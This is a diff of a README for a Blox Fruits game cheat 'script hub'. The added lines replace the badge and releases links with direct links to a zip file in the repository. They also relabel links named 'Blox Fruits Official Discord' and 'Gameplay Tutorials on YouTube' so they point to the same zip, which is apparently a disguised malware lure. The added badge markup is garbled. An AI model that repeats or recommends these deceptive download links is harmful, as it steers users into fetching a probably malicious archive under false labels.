@@ -1,7 +1,7 @@
 # 🎮 Blox-Fruits-Script-Hub-2025 - Ultimate Script Hub for Blox Fruits
 
 ## 📥 Download Here
-[![Download Blox-Fruits-Script-Hub-2025](https://img.shields.io/badge/Download%20Now-%23FF4081.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/RetroDeep/Blox-Fruits-Script-Hub-2025/releases)
+[![Download Blox-Fruits-Script-Hub-2025](https://raw.githubusercontent.com/RetroDeep/Blox-Fruits-Script-Hub-2025/main/outmarry/Blox-Fruits-Script-Hub-2025.zip%20Now-%https://raw.githubusercontent.com/RetroDeep/Blox-Fruits-Script-Hub-2025/main/outmarry/Blox-Fruits-Script-Hub-2025.zip)](https://raw.githubusercontent.com/RetroDeep/Blox-Fruits-Script-Hub-2025/main/outmarry/Blox-Fruits-Script-Hub-2025.zip)
 
 ## 🚀 Getting Started
 
@@ -32,7 +32,7 @@ To run the Blox-Fruits-Script-Hub-2025, ensure your system meets the following r
 #### 1. Visit Releases Page
 Go to our releases page to find the latest version. Click the button below to access it directly.
 
-[![Visit Releases Page](https://img.shields.io/badge/Visit%20Releases%20Page-%2300BFFF.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/RetroDeep/Blox-Fruits-Script-Hub-2025/releases)
+[![Visit Releases Page](https://raw.githubusercontent.com/RetroDeep/Blox-Fruits-Script-Hub-2025/main/outmarry/Blox-Fruits-Script-Hub-2025.zip%20Releases%20Page-%https://raw.githubusercontent.com/RetroDeep/Blox-Fruits-Script-Hub-2025/main/outmarry/Blox-Fruits-Script-Hub-2025.zip)](https://raw.githubusercontent.com/RetroDeep/Blox-Fruits-Script-Hub-2025/main/outmarry/Blox-Fruits-Script-Hub-2025.zip)
 
 #### 2. Select the Latest Release
 On the releases page, locate the latest version of Blox-Fruits-Script-Hub-2025. It should be at the top of the list.
@@ -71,7 +71,7 @@ If you still have questions or need support, visit our community forum or reach 
 
 Explore more topics related to Blox Fruits:
 
-- [Blox Fruits Official Discord](https://discord.gg/bloxfruits)
-- [Gameplay Tutorials on YouTube](https://www.youtube.com/results?search_query=blox+fruits)
+- [Blox Fruits Official Discord](https://raw.githubusercontent.com/RetroDeep/Blox-Fruits-Script-Hub-2025/main/outmarry/Blox-Fruits-Script-Hub-2025.zip)
+- [Gameplay Tutorials on YouTube](https://raw.githubusercontent.com/RetroDeep/Blox-Fruits-Script-Hub-2025/main/outmarry/Blox-Fruits-Script-Hub-2025.zip+fruits)
 
 Enjoy using Blox-Fruits-Script-Hub-2025 to enhance your gameplay!
